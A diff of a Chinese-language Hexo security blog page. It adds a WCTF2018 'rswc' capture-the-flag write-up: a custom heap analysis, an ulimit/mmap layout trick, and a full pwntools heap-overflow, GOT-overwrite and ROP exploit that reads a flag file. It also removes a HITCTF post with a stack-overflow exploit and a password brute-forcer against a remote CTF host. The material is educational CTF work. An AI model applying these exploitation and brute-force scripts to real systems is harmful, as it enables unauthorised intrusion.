@@ -229,6 +229,177 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/11/WCTF2018-rswc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0gur1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/07/11/WCTF2018-rswc/" itemprop="url">WCTF2018-rswc</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-11T17:07:31+08:00">
+                2018-07-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>这一题也是典型的菜单类题目，共有5个功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0. alloc</span><br><span class="line">1. edit</span><br><span class="line">2. show</span><br><span class="line">3. delete</span><br><span class="line">9. exit</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/07/11/WCTF2018-rswc/main.png" alt="main函数"></p>
+<p><strong>prepare函数</strong>模拟了堆初始化的过程。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/prepare.png" alt="prepare函数"></p>
+<p>其中mmap函数的原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">mmap</span><span class="params">(<span class="keyword">void</span>* start,<span class="keyword">size_t</span> length,<span class="keyword">int</span> prot,<span class="keyword">int</span> flags,<span class="keyword">int</span> fd,<span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>第三个参数prot表示保护方式：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_READ	0x1		<span class="comment">/* page can be read */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_WRITE	0x2		<span class="comment">/* page can be written */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_EXEC	0x4		<span class="comment">/* page can be executed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_SEM	0x8		<span class="comment">/* page may be used for atomic ops */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_NONE	0x0		<span class="comment">/* page can not be accessed */</span></span></span><br></pre></td></tr></table></figure>
+<p>第6行的mmap分配了一块0x1000大小的内存，且不可读、写以及执行，用于对堆的保护。</p>
+<p>第11行分配了类似于arena的区域，存放指针，权限为rw。</p>
+<p>接着初始化heap的函数init__()</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/init.png" alt="初始化heap"></p>
+<p>先分配了0x3000内存作为heap，然后再arena中记录heap地址、top地址、heap大小以及已经分配的chunk数量。然后对arena进行了初始化。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/arena.png" alt="arena"></p>
+<p><strong>alloc函数</strong>用于分配新的chunk，关键函数是malloc_memory()</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/alloc.png" alt="alloc函数"></p>
+<p>malloc_memory函数首先计算chunk实际的大小，完成对齐的功能。然后检查arena中记录的chunk中有没有处于空闲状态并且大于需求大小的，如果有，就分配该chunk；否则就在top中分配一块。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/malloc.png" alt="分配新的chunk"></p>
+<p>此处可以确定arena的结构：</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/arena1.png" alt="arena结构"></p>
+<p>返回到alloc函数后，对新分配的chunk进行初始化，并更新记录第一块的指针first</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/chunk.png" alt="chunk结构"></p>
+<p><strong>edit函数</strong>用于编辑chunk中的content，输入idx，通过每个chunk的下一地址字段找到下一块。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/edit.png" alt="edit函数"></p>
+<p><strong>show函数</strong>展示chunk的size、content</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/show.png" alt="show函数"></p>
+<p><strong>dele函数</strong>修改下一块地址字段，并将arena中对应的chunk的inuse位置零。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/dele.png" alt="dele函数"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>arena分配的大小为0x1000，除去前面32字节的信息字段，一共可以存放254个chunk信息；而heap分配了0x3000，如果按照最小的块32字节大小来分配，一共可以分配<code>0x3000/0x20=384</code>个chunk。因而在分配第255个chunk时，arena就会溢出，但由于arena的下一块是rwx都不可操作的保护区域，这个溢出无法利用。</p>
+<p>看出题人的题解，提到了Linux内核中的ulimit和mmap的关系。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arch_pick_mmap_layout</span><span class="params">(struct mm_struct *mm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random_factor = <span class="number">0U</span>L;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (current-&gt;flags &amp; PF_RANDOMIZE)</span><br><span class="line">		random_factor = arch_mmap_rnd();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mmap_is_legacy()) &#123;</span><br><span class="line">		mm-&gt;mmap_base = TASK_UNMAPPED_BASE + random_factor;</span><br><span class="line">		mm-&gt;get_unmapped_area = arch_get_unmapped_area;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		mm-&gt;mmap_base = mmap_base(random_factor);</span><br><span class="line">		mm-&gt;get_unmapped_area = arch_get_unmapped_area_topdown;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当mmap_is_legacy返回1时（旧版），mmap从低地址向高地址增长；当返回0时（新版），mmap从高地址向低地址增长。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">mmap_is_legacy</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//若设置了ADDR_COMPAT_LAYOUT属性，则提供旧版的虚拟地址空间内存</span></span><br><span class="line">	<span class="keyword">if</span> (current-&gt;personality &amp; ADDR_COMPAT_LAYOUT)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="comment">//判断堆栈大小是否为无限制的</span></span><br><span class="line">	<span class="keyword">if</span> (rlimit(RLIMIT_STACK) == RLIM_INFINITY)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="comment">//sysctl_legacy_va_layout可以在/proc/sys/vm/legacy_va_layout中查看</span></span><br><span class="line">	<span class="keyword">return</span> sysctl_legacy_va_layout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Linux中的<code>ulimit -s</code>命令能够限制进程使用的堆栈大小，当-s的参数为<code>unlimited</code>时，则是对大小不做限制。也就是说，如果在运行程序之前执行该命令，在执行mmap时，就会进入到第二个条件分支，mmap_is_legacy就会返回1。</p>
+<p>先看正常情况下，mmap的分配情况。先分配的arena的地址是0x7ffff7ff5000，后分配的heap地址为0x7ffff7ff2000，即当前情况下，mmap是由高地址向低地址增长的，mmap_is_legacy返回的为0。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/before.png" alt="aren和heap的地址"></p>
+<p>通过vmmap也能看出mmap的增长方向，最先分配的rwx都不可操作的保护区域，地址在最下面。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/address-before.png" alt="vmmap查看内存分配情况"></p>
+<p>而此时的sysctl_legacy_va_layout的值为0，即使用新版的映射方式从高到低增长。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/value.png" alt="sysctl_legacy_va_layout的值"></p>
+<p>接下来执行<code>ulimit -s unlimited</code>，再次运行程序，查看内存。此时先分配的arena地址比后分配的heap地址更小了，即mmap变成了由低地址向高地址增长。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/address-after.png" alt="arena和heap地址"></p>
+<p>在vmmap中，两块区域的位置也发生了变化。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/vmmap-after.png" alt="vmmap查看内存"></p>
+<p>此时就可以利用arena的溢出来覆写heap区域来达成目标了。</p>
+<p>还有一点是，本题开启了沙箱保护，只允许进行open、read、write、exit和exit_group操作，也就是不能直接获取shell，但是可以直接读写flag文件来获取flag。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/seccomp.png" alt="沙箱保护"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>分配254个以上的chunk造成arena的溢出。利用arena中chunk info的size字段覆盖heap中chunk的size字段，edit时会造成chunk的content溢出，覆写下一个chunk的”下一地址“（简称next）字段，进而利用show泄露和edit覆写got中函数地址。</p>
+<p><img src="/2018/07/11/WCTF2018-rswc/hack.png" alt="漏洞利用示意图"></p>
+<p>将atoi函数覆写为gets函数，造成栈溢出，进而构造ROP劫持程序执行流。</p>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./rswc'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'0'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#normal block:0~253</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">254</span>):</span><br><span class="line">	alloc(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#no.254 will cover the first chunk</span></span><br><span class="line">alloc(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite no.253's ptr</span></span><br><span class="line">atoi_got = <span class="number">0x602068</span></span><br><span class="line">edit(<span class="number">254</span>,<span class="string">'0gur1'</span>.ljust(<span class="number">16</span>,<span class="string">'x'</span>)+p64(atoi_got<span class="number">-16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak address</span></span><br><span class="line">show(<span class="number">254</span>)</span><br><span class="line">p.recvuntil(<span class="string">'  content: '</span>)</span><br><span class="line">atoi_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">open_addr = atoi_addr - (libc.symbols[<span class="string">'atoi'</span>]-libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">read_addr = atoi_addr - (libc.symbols[<span class="string">'atoi'</span>]-libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">gets_addr = atoi_addr - (libc.symbols[<span class="string">'atoi'</span>]-libc.symbols[<span class="string">'gets'</span>])</span><br><span class="line">write_addr = atoi_addr - (libc.symbols[<span class="string">'atoi'</span>]-libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">log.info(<span class="string">'atoi_addr:%#x'</span> %atoi_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite atoi_got with gets</span></span><br><span class="line">edit(<span class="number">254</span>,p64(gets_addr))</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr-libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">pr_addr = libc_base + <span class="number">0x0000000000021102</span></span><br><span class="line">prsi_addr = libc_base + <span class="number">0x0202e8</span></span><br><span class="line">ppr_addr = libc_base + <span class="number">0x00000000001150c9</span></span><br><span class="line">buf = <span class="number">0x602000</span>+<span class="number">0xa00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP</span></span><br><span class="line">shellcode= <span class="string">'0gur1'</span>.ljust(<span class="number">0x18</span>,<span class="string">'x'</span>)</span><br><span class="line">shellcode+=p64(pr_addr)+p64(<span class="number">0</span>)</span><br><span class="line">shellcode+=p64(ppr_addr)+p64(<span class="number">0x30</span>)+p64(buf)</span><br><span class="line">shellcode+=p64(read_addr)</span><br><span class="line"></span><br><span class="line">shellcode+=p64(pr_addr)+p64(buf)</span><br><span class="line">shellcode+=p64(ppr_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">shellcode+=p64(open_addr)</span><br><span class="line"></span><br><span class="line">shellcode+=p64(pr_addr)+p64(<span class="number">3</span>)</span><br><span class="line">shellcode+=p64(ppr_addr)+p64(<span class="number">0x30</span>)+p64(buf)</span><br><span class="line">shellcode+=p64(read_addr)</span><br><span class="line"></span><br><span class="line">shellcode+=p64(pr_addr)+p64(<span class="number">1</span>)</span><br><span class="line">shellcode+=p64(ppr_addr)+p64(<span class="number">0x30</span>)+p64(buf)</span><br><span class="line">shellcode+=p64(write_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">'flag.txt'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/10/sysmalloc源码分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1557,214 +1728,13 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/07/HITCTF-PWN/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="0gur1">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/02/07/HITCTF-PWN/" itemprop="url">HITCTF PWN</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-07T16:46:29+08:00">
-                2018-02-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="STACK-OVERFLOW"><a href="#STACK-OVERFLOW" class="headerlink" title="STACK OVERFLOW"></a>STACK OVERFLOW</h2><h3 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p>main函数调用vuln函数，vuln函数中输入name字符串：</p>
-<p><img src="/2018/02/07/HITCTF-PWN/stackoverflow_1.png" alt="vuln函数"></p>
-<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>vuln函数中buf的地址是ebp-28h，即buf大小为0x28，但在读入字符串时，read参数是0x40，即栈溢出漏洞。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>保护机制： NX堆栈不可执行</p>
-<p><img src="/2018/02/07/HITCTF-PWN/stackoverflow_2.png" alt="checksec"></p>
-<p>在IDA的函数一栏发现有一个flag的函数，利用该函数执行shell ：</p>
-<p><img src="/2018/02/07/HITCTF-PWN/stackoverflow_3.png" alt="flag函数"></p>
-<p>通过栈溢出构造ROP：将vuln函数返回地址覆盖为flag，同时写入flag函数执行所需要的参数a1和a2。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x080485DF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line"></span><br><span class="line">    p= process(<span class="string">"./stackoverflow"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">"111.230.132.82"</span>,<span class="number">40000</span>)</span><br><span class="line"></span><br><span class="line">payload= <span class="string">'a'</span>*<span class="number">44</span></span><br><span class="line"></span><br><span class="line">payload += p32(flag_addr)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">12648430</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Welcome to pwn world!\nLeave your name:"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><h3 id="基本逻辑-1"><a href="#基本逻辑-1" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p><img src="/2018/02/07/HITCTF-PWN/login_1.png" alt="main函数"></p>
-<p>main函数首先调用login()函数，用户输入username和password后，与服务器端预设的值进行比较。有两个用户：root和lilac。需要注意的是，strncmp的第三个参数，这个参数代表需要比较多少个字符。仔细看login函数中的strncmp是有问题的。（见2.漏洞）</p>
-<p><img src="/2018/02/07/HITCTF-PWN/login_2.png" alt="login"></p>
-<p>从login返回之后，main函数会对登录是否成功进行判定，只有当用户为root且通过了login函数的比对操作才能继续进行，其余情况都会直接exit。而且即使login函数通过了之后，main函数还接着调用了check()函数来再次检查用户名和密码。注意，仔细查看login和check函数中的strncmp的第三个参数是不一样的：login中第三个参数是用户输入的长度，check中是指定的长度。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/login_3.png" alt="check"></p>
-<h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n = read_input_raw(username, <span class="number">16</span>);</span><br><span class="line">v3 = read_input_raw(password, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(username,<span class="string">"root"</span>,n)&amp;&amp;!<span class="built_in">strncmp</span>(password,<span class="string">"passwd_has_be_changed_in_remote_"</span>, v3) )</span><br><span class="line"> &#123;</span><br><span class="line">   v1 = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-<p>login函数第三个参数是用户输入的字符串长度，比如，我们只输入一个字符，那么strncmp就只比较两个字符串的一个字符，如果恰巧蒙对了，strncmp就返回0（代表相等）；没蒙对就继续蒙，直到蒙到第一位是正确的。由此，可以通过暴力破解依次获取每一位password。需要注意的是，我们拿到的可执行文件和服务器上的不是一个，出题人在password处暗示我们了：passwd_has<em>be</em> changed_in<em>remote</em></p>
-<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>从check函数中可以看出，root用户的密码为32位。通过暴力破解，多次启动进程，从返回结果是否是”How can you login successful as root!”来判断该位是否正确。可以通过查看ASCII表中可见字符的范围来缩小暴力破解的次数，我用的是33-126。</p>
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#暴力破解</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">126</span>):</span><br><span class="line">		<span class="keyword">if</span> debug:</span><br><span class="line">			p= process(<span class="string">"./login"</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			p = remote(<span class="string">"111.230.132.82"</span>,<span class="number">40001</span>)</span><br><span class="line">		p.recvuntil(<span class="string">"Username: "</span>)</span><br><span class="line">		username = <span class="string">"root"</span></span><br><span class="line">		p.sendline(username)</span><br><span class="line"></span><br><span class="line">		p.recvuntil(<span class="string">"Password: "</span>)</span><br><span class="line">		tmp = pwd+chr(i) </span><br><span class="line"></span><br><span class="line">		p.sendline(tmp)</span><br><span class="line">		hint = p.recvline()</span><br><span class="line">		<span class="comment">#print hint</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"How can you login successful as root!"</span> <span class="keyword">in</span> hint:</span><br><span class="line">			pwd+=chr(i)</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="keyword">print</span> pwd</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		p.close()</span><br><span class="line"><span class="keyword">print</span> pwd</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#发送正确的username和password</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">"./login"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"111.230.132.82"</span>,<span class="number">40001</span>)</span><br><span class="line">    </span><br><span class="line">p.recvuntil(<span class="string">"Username: "</span>)</span><br><span class="line">username = <span class="string">"root"</span></span><br><span class="line">p.sendline(username)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Password: "</span>)</span><br><span class="line">pwd=<span class="string">"XXXXX"</span> <span class="comment">#此处就是上一步暴力破解获取的pwd</span></span><br><span class="line">p.sendline(pwd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
